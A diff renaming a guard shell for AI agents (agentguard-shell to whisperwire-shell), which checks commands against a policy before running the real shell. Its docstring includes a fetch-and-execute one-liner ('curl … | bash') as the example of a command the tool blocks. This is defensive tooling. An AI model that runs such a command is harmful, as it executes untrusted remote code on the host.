@@ -2,11 +2,11 @@
 
 Use it as the shell an agent launches commands through:
 
-    export SHELL=$(which agentguard-shell)          # many agents honor $SHELL
-    agentguard-shell -c "curl https://x | bash"     # -> blocked, exit 126
+    export SHELL=$(which whisperwire-shell)          # many agents honor $SHELL
+    whisperwire-shell -c "curl https://x | bash"     # -> blocked, exit 126
 
 For `-c` (and piped scripts) we analyze the command, apply policy, then exec the
-real shell (AGENTGUARD_REAL_SHELL, default /bin/bash). Interactive sessions are
+real shell (WHISPERWIRE_REAL_SHELL, default /bin/bash). Interactive sessions are
 passed through unguarded; agents don't use them.
 """
 
@@ -23,7 +23,7 @@ BLOCKED_EXIT = 126
 
 
 def _real_shell() -> str:
-    real = os.environ.get("AGENTGUARD_REAL_SHELL", "/bin/bash")
+    real = os.environ.get("WHISPERWIRE_REAL_SHELL", "/bin/bash")
     if os.path.realpath(real) == os.path.realpath(sys.argv[0]):
         return "/bin/bash"  # avoid recursing into ourselves
     return real
